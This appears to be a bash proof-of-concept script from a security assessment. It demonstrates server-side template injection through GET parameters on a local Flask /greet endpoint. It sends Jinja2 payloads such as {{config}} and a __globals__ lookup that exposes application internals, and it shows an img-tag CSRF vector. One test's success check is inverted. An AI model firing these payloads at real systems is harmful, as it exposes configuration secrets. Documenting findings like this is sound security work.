#!/bin/bash

# POC: GET Method SSTI Vulnerability Demonstration
# This script demonstrates how using GET method makes SSTI payload delivery trivial
# and stores payloads in URLs, logs, and browser history

TARGET="${1:-http://localhost:5000}"
ENDPOINT="/greet"

echo "=========================================="
echo "GET Method SSTI Vulnerability POC"
echo "Target: ${TARGET}${ENDPOINT}"
echo "=========================================="
echo ""

# Test 1: Simple GET request with SSTI payload in URL
echo "[Test 1] SSTI Payload Delivery via GET Method (URL Parameter)"
echo "Request: GET ${ENDPOINT}?name={{7*7}}"
echo ""

RESPONSE=$(curl -s "${TARGET}${ENDPOINT}?name={{7*7}}")
echo "Response:"
echo "$RESPONSE"
echo ""

# Check if payload was evaluated
if echo "$RESPONSE" | grep -q "49"; then
    echo "✓ SSTI payload {{7*7}} was evaluated to 49"
    echo "✓ This proves GET method allows trivial SSTI payload delivery"
else
    echo "✗ Payload might have been evaluated differently"
fi
echo ""

# Test 2: Demonstrate URL-based payload (browser history exposure)
echo "[Test 2] URL Encoding - Payloads stored in URLs"
PAYLOAD_URL="${TARGET}${ENDPOINT}?name={{7*7}}"
echo "Full URL with SSTI payload:"
echo "$PAYLOAD_URL"
echo ""
echo "✓ This URL would appear in:"
echo "  - Browser history"
echo "  - Browser cache"
echo "  - Server access logs"
echo "  - Reverse proxy logs"
echo "  - Referrer headers in subsequent requests"
echo ""

# Test 3: Show how easy it is to craft malicious URLs
echo "[Test 3] Trivial Payload Crafting"
echo "An attacker can easily craft malicious URLs without any technical barriers:"
echo ""

PAYLOADS=(
    "{{7*7}}"
    "{{config}}"
    "{{get_flashed_messages.__globals__['current_app']}}"
)

for payload in "${PAYLOADS[@]}"; do
    ENCODED=$(printf %s "$payload" | jq -sRr @uri)
    echo "  URL: ${TARGET}${ENDPOINT}?name=${ENCODED}"
done
echo ""

# Test 4: Demonstrate GET vs POST semantics
echo "[Test 4] HTTP Semantics Comparison"
echo ""
echo "Current Implementation (GET):"
curl -s -X GET "${TARGET}${ENDPOINT}?name=test" > /dev/null 2>&1 && echo "  ✓ GET request accepted"
echo "  ✓ Parameters in URL (visible, logged, cached)"
echo "  ✓ No CSRF protection needed (stateless)"
echo "  ✓ Easy to share/bookmark malicious URLs"
echo ""

echo "Best Practice (POST):"
curl -s -X POST "${TARGET}${ENDPOINT}" -d "name=test" > /dev/null 2>&1 && {
    echo "  ✗ POST request failed (not implemented yet)"
} || {
    echo "  - Would require parameters in body (not logged by default)"
    echo "  - Would require CSRF token validation"
    echo "  - Harder to accidentally share malicious URLs"
}
echo ""

# Test 5: Show how GET makes CSRF attacks simpler
echo "[Test 5] CSRF Attack Simplification"
echo ""
echo "With GET method, CSRF attack is trivial - just an IMG tag:"
echo ""
echo '<img src="http://target/greet?name={{malicious_payload}}">'
echo ""
echo "✓ No form submission needed"
echo "✓ No JavaScript required"
echo "✓ Works even with strict CSP policies"
echo ""

echo "=========================================="
echo "Summary: GET method for SSTI endpoint:"
echo "- Makes payload delivery trivial (URL crafting)"
echo "- Stores payloads in multiple locations (history, logs, cache)"
echo "- Simplifies CSRF attacks"
echo "- Violates HTTP semantics"
echo "=========================================="